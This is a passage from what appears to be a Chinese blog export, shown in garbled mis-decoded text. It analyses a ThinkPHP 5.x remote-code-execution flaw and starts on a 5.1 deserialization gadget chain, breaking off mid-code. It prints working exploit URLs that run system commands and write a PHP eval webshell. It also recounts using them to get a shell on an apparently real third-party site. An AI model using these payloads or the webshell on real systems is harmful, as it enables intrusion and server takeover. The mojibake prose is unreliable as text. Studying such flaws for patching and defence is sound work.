class="variable">$dispatch</span>[<span class="string">&#x27;type&#x27;</span>]) &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;redirect&#x27;</span>: <span class="comment">// é‡å®šå‘è·³è½¬</span></span><br><span class="line">              <span class="variable">$data</span> = Response::create(<span class="variable">$dispatch</span>[<span class="string">&#x27;url&#x27;</span>], <span class="string">&#x27;redirect&#x27;</span>)</span><br><span class="line">                  -&gt;code(<span class="variable">$dispatch</span>[<span class="string">&#x27;status&#x27;</span>]);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;module&#x27;</span>: <span class="comment">// æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ</span></span><br><span class="line">              <span class="variable">$data</span> = <span class="built_in">self</span>::module(</span><br><span class="line">                  <span class="variable">$dispatch</span>[<span class="string">&#x27;module&#x27;</span>],</span><br><span class="line">                  <span class="variable">$config</span>,</span><br><span class="line">                  <span class="keyword">isset</span>(<span class="variable">$dispatch</span>[<span class="string">&#x27;convert&#x27;</span>]) ? <span class="variable">$dispatch</span>[<span class="string">&#x27;convert&#x27;</span>] : <span class="literal">null</span></span><br><span class="line">              );</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">      .........................  </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¯¥å‡½æ•°ä¸­ï¼Œé¦–å…ˆè·¯ç”±ä¿¡æ¯é¦–å…ˆè¿›å…¥module()å‡½æ•°è¿›è¡Œæ£€éªŒï¼Œè¯¥å‡½æ•°é¦–å…ˆæŸ¥çœ‹è¯¥è·¯ç”±ä¸­çš„æ¨¡å—ä¿¡æ¯æ˜¯å¦å­˜åœ¨ä¸”æ˜¯å¦å­˜åœ¨äºç¦æ­¢çš„æ¨¡å—ç±»è¡¨ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">module</span>(<span class="params"><span class="variable">$result</span>, <span class="variable">$config</span>, <span class="variable">$convert</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_string(<span class="variable">$result</span>)) &#123;</span><br><span class="line">        <span class="variable">$result</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$request</span> = Request::instance();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$config</span>[<span class="string">&#x27;app_multi_module&#x27;</span>]) &#123;</span><br><span class="line">        <span class="comment">// å¤šæ¨¡å—éƒ¨ç½²</span></span><br><span class="line">        <span class="variable">$module</span> = strip_tags(strtolower(<span class="variable">$result</span>[<span class="number">0</span>] ?: <span class="variable">$config</span>[<span class="string">&#x27;default_module&#x27;</span>]));</span><br><span class="line">        <span class="variable">$bind</span> = Route::getBind(<span class="string">&#x27;module&#x27;</span>);</span><br><span class="line">        <span class="variable">$available</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$bind</span>) &#123;</span><br><span class="line">            <span class="comment">// ç»‘å®šæ¨¡å—</span></span><br><span class="line">            <span class="keyword">list</span>(<span class="variable">$bindModule</span>) = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$bind</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$result</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">                <span class="variable">$module</span> = <span class="variable">$bindModule</span>;</span><br><span class="line">                <span class="variable">$available</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="variable">$module</span> == <span class="variable">$bindModule</span>) &#123;</span><br><span class="line">                <span class="variable">$available</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">      .......</span><br></pre></td></tr></table></figure><p>æ¨¡å—å­˜åœ¨çš„è¯ï¼Œç»§ç»­å¾€ä¸‹è·Ÿè¸ªï¼Œåˆ†åˆ«å°†æ¨¡å—ä¸­çš„controllerã€actionNameç»è¿‡å¤„ç†åèµ‹å€¼åˆ°<code>$instance</code>ã€<code>$action</code>ï¼Œæœ€ç»ˆ<code>$instance</code>ã€<code>$action</code>è¢«èµ‹å€¼ç»™äº†<code>$call</code>å‚æ•°ã€‚æœ€ç»ˆ$callå‚æ•°è¿›å…¥äº†self::invokeMethod()è¿›è¡Œå¤„ç†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">invokeMethod</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$vars</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$method</span>)) &#123;</span><br><span class="line">        <span class="variable">$class</span> = is_object(<span class="variable">$method</span>[<span class="number">0</span>]) ? <span class="variable">$method</span>[<span class="number">0</span>] : <span class="built_in">self</span>::invokeClass(<span class="variable">$method</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="variable">$reflect</span> = <span class="keyword">new</span> \ReflectionMethod(<span class="variable">$class</span>, <span class="variable">$method</span>[<span class="number">1</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// é™æ€æ–¹æ³•</span></span><br><span class="line">        <span class="variable">$reflect</span> = <span class="keyword">new</span> \ReflectionMethod(<span class="variable">$method</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$args</span> = <span class="built_in">self</span>::bindParams(<span class="variable">$reflect</span>, <span class="variable">$vars</span>);</span><br><span class="line">    <span class="built_in">self</span>::<span class="variable">$debug</span> &amp;&amp; Log::record(<span class="string">&#x27;[ RUN ] &#x27;</span> . <span class="variable">$reflect</span>-&gt;class . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$reflect</span>-&gt;name . <span class="string">&#x27;[ &#x27;</span> . <span class="variable">$reflect</span>-&gt;getFileName() . <span class="string">&#x27; ]&#x27;</span>, <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$reflect</span>-&gt;invokeArgs(<span class="keyword">isset</span>(<span class="variable">$class</span>) ? <span class="variable">$class</span> : <span class="literal">null</span>, <span class="variable">$args</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨å‡½æ•°ä¸­ï¼Œé€šè¿‡åå°„ReflectionMethodè·å–controller(method[0])å’Œaction(method[1])å¯¹è±¡ä¸‹çš„æ–¹æ³•ï¼Œç„¶åé€šè¿‡<code>$args </code>= self::bindParams(<code>$reflect</code>, <code>$vars</code>);è·å–åˆ°ä¼ å…¥å‚æ•°ï¼ˆä¹Ÿå°±æ˜¯Payloadï¼‰ã€‚</p><p>æœ€ååœ¨è°ƒç”¨åå°„<code>$reflect</code>-&gt;invokeArgs($args);ï¼Œå°†Payloadæ•°ç»„ä¼ å…¥åå°„å¯¹è±¡å‡½æ•°invokeFunctionï¼Œé€šè¿‡æ„é€ å¥½çš„å‚æ•°ï¼Œå¯æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">invokeFunction</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$vars</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$reflect</span> = <span class="keyword">new</span> \ReflectionFunction(<span class="variable">$function</span>);</span><br><span class="line">        <span class="variable">$args</span> = <span class="built_in">self</span>::bindParams(<span class="variable">$reflect</span>, <span class="variable">$vars</span>);</span><br><span class="line">        <span class="comment">// è®°å½•æ‰§è¡Œä¿¡æ¯</span></span><br><span class="line">        <span class="built_in">self</span>::<span class="variable">$debug</span> &amp;&amp; Log::record(<span class="string">&#x27;[ RUN ] &#x27;</span> . <span class="variable">$reflect</span>-&gt;__toString(), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$reflect</span>-&gt;invokeArgs(<span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><p>dockerç¯å¢ƒï¼š<a href="https://vulhub.org/#/environments/thinkphp/5-rce/">Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability</a></p><ol><li><p>åˆ©ç”¨ system å‡½æ•°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</p><p><code>http://121.40.95.148:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210913233136968.png" alt="image-20210913233136968"></p></li><li><p>é€šè¿‡phpinfo()å‡½æ•°æ˜¾ç¤ºPHPä¿¡æ¯</p><p><code>http://121.40.95.148:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210913233326906.png" alt="image-20210913233326906"></p></li><li><p>å†™å…¥shell</p><p><code>http://121.40.95.148:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=./test.php&amp;vars[1][]=&lt;?php @eval($_POST[cmd]);?&gt;</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210913234200819.png" alt="image-20210913234200819"></p></li></ol><h1 id="å®æˆ˜åº”ç”¨"><a href="#å®æˆ˜åº”ç”¨" class="headerlink" title="å®æˆ˜åº”ç”¨"></a>å®æˆ˜åº”ç”¨</h1><p>é€šè¿‡æ¼æ‰«å·¥å…·æ£€æµ‹åˆ°æŸç«™ç‚¹å¯èƒ½å­˜åœ¨<code>poc-yaml-thinkphp5-controller-rce</code></p><p>ç›´æ¥ä¸Špayloadï¼Œå¯æŸ¥çœ‹phpinfo</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210913205818270.png" alt="image-20210913205818270"></p><p>ä½†æ‰§è¡Œä¸äº†ç³»ç»Ÿå‘½ä»¤ï¼Œç¦æ­¢äº†system()ã€assert()ç­‰å‡½æ•°</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210913205950246.png" alt="image-20210913205950246"></p><p>å°è¯•å†™å…¥shellï¼ŒæˆåŠŸï¼</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210913210422113.png" alt="image-20210913210422113"></p><p>é¡ºåŠ¿èšå‰‘è¿æ¥ï¼ŒgetshellæˆåŠŸï¼</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210913210704307.png" alt="image-20210913210704307"></p><p>ç¬¬ä¸€ä¸ªé«˜å±æ¼æ´æ‹¿ä¸‹ï¼</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210913211441980.png" alt="image-20210913211441980"></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><blockquote><p><a href="https://www.secpulse.com/archives/93903.html">https://www.secpulse.com/archives/93903.html</a></p><p><a href="https://y4er.com/post/thinkphp5-rce/">https://y4er.com/post/thinkphp5-rce/</a></p><p><a href="https://drunkmars.top/2021/04/14/thinkphp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E6%80%BB%E7%BB%93/">https://drunkmars.top/2021/04/14/thinkphp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E6%80%BB%E7%BB%93/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHPv5.1ååºåˆ—é“¾åˆ†æ</title>
      <link href="posts/32358.html"/>
      <url>posts/32358.html</url>
      
        <content type="html"><![CDATA[<h1 id="å›é¡¾"><a href="#å›é¡¾" class="headerlink" title="å›é¡¾"></a>å›é¡¾</h1><p>å…ˆæ¥å›é¡¾ä¸‹ååºåˆ—åŒ–ä¸­å¸¸ç”¨åˆ°çš„å‡ ä¸ªé­”æ³•å‡½æ•°</p><ul><li>__construct()ï¼šåˆ›å»ºå¯¹è±¡æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨</li><li>__destruct()ï¼šå¯¹è±¡é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨</li><li>__sleep()ï¼šæ‰§è¡Œserialize()æ—¶è‡ªåŠ¨è°ƒç”¨</li><li>__wake()ï¼šæ‰§è¡Œunserialize()æ—¶è‡ªåŠ¨è°ƒç”¨</li><li>__toString()ï¼šå¯¹è±¡è¢«ä½œä¸ºå­—ç¬¦ä¸²å¤„ç†æ—¶è‡ªåŠ¨è°ƒç”¨</li><li>__get()ï¼šä»ä¸å¯è®¿é—®çš„å±æ€§ä¸­è¯»å–æ•°æ®æ—¶è‡ªåŠ¨è°ƒç”¨</li><li>__call()ï¼šè°ƒç”¨ç±»ä¸­ä¸å­˜åœ¨çš„æˆ–ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è‡ªåŠ¨è°ƒç”¨</li></ul><h1 id="ååºåˆ—åŒ–é“¾åˆ†æ"><a href="#ååºåˆ—åŒ–é“¾åˆ†æ" class="headerlink" title="ååºåˆ—åŒ–é“¾åˆ†æ"></a>ååºåˆ—åŒ–é“¾åˆ†æ</h1><p>å¯»æ‰¾å…¥å£ç‚¹ï¼Œå…¨å±€æœç´¢<code>__destruct()</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210905144702142.png" alt="image-20210905144702142"></p><p>å‰ä¸‰å¤„éƒ½æ˜¯æ‰§è¡Œ<code>$this-&gt;stop();</code>ï¼Œå…³é—­è¿æ¥ï¼Œæ— æ³•åˆ©ç”¨</p><p>ç¬¬å››ä¸ªæ˜¯think/process/pipesä¸‹Windowsç±»çš„<code>__destruct()</code> ï¼Œé™¤äº†stop()æ–¹æ³•ï¼Œè¿˜æœ‰ä¸€ä¸ªremoveFiles()æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;close();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;removeFiles();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¨æ–‡è¿½è¸ªæ­¤å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åˆ é™¤ä¸´æ—¶æ–‡ä»¶</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            @unlink(<span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬20è¡Œå¤„ private $files = [];</p><p>æ‰€ä»¥è¿™é‡Œçš„$this-&gt;fileså¯æ§ï¼Œç»“åˆ@unlink()ï¼Œæ•…å­˜åœ¨ä»»æ„æ–‡ä»¶åˆ é™¤ã€‚</p><p>æ³¨æ„åˆ°file_exists()ï¼Œå¦‚æœä¼ å…¥çš„å‚æ•°æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™é‡Œå®ƒè¢«å½“æˆå­—ç¬¦ä¸²å¤„ç†ï¼Œåˆ™ä¼šè§¦å‘<code>__toString()</code>ï¼Œè€Œä¼ å…¥çš„å‚æ•°æ­£æ˜¯æˆ‘ä»¬å¯æ§çš„</p><p>æ¥ä¸‹æ¥å°è¯•å»å¯»æ‰¾æœ‰æ— å¯åˆ©ç”¨çš„<code>__toString()</code></p><p>åœ¨think\model\concernçš„trait Conversionä¸­å­˜åœ¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›toJson()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è½¬æ¢å½“å‰æ¨¡å‹å¯¹è±¡ä¸ºJSONå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  integer $options jsonå‚æ•°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="variable">$options</span> = JSON_UNESCAPED_UNICODE</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), <span class="variable">$options</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›toArray()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$item</span>       = [];</span><br><span class="line">    <span class="variable">$hasVisible</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;visible <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_string(<span class="variable">$val</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strpos(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                <span class="keyword">list</span>(<span class="variable">$relation</span>, <span class="variable">$name</span>)      = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;visible[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;visible[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">                <span class="variable">$hasVisible</span>          = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;hidden <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_string(<span class="variable">$val</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strpos(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                <span class="keyword">list</span>(<span class="variable">$relation</span>, <span class="variable">$name</span>)     = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;hidden[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;hidden[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆå¹¶å…³è”æ•°æ®</span></span><br><span class="line">    <span class="variable">$data</span> = array_merge(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">            <span class="comment">// å…³è”æ¨¡å‹å¯¹è±¡</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[<span class="variable">$key</span>]) &amp;&amp; is_array(<span class="keyword">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="variable">$val</span>-&gt;visible(<span class="keyword">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; is_array(<span class="keyword">$this</span>-&gt;hidden[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="variable">$val</span>-&gt;hidden(<span class="keyword">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// å…³è”æ¨¡å‹å¯¹è±¡</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[<span class="variable">$key</span>]) || <span class="literal">true</span> !== <span class="keyword">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>-&gt;toArray();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; !<span class="variable">$hasVisible</span>) &#123;</span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿½åŠ å±æ€§ï¼ˆå¿…é¡»å®šä¹‰è·å–å™¨ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">                <span class="variable">$relation</span> = <span class="keyword">$this</span>-&gt;getRelation(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                    <span class="variable">$relation</span> = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span>-&gt;visible(<span class="variable">$name</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;append(<span class="variable">$name</span>)-&gt;toArray() : [];</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (strpos(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">                <span class="variable">$relation</span> = <span class="keyword">$this</span>-&gt;getRelation(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                    <span class="variable">$relation</span> = <span 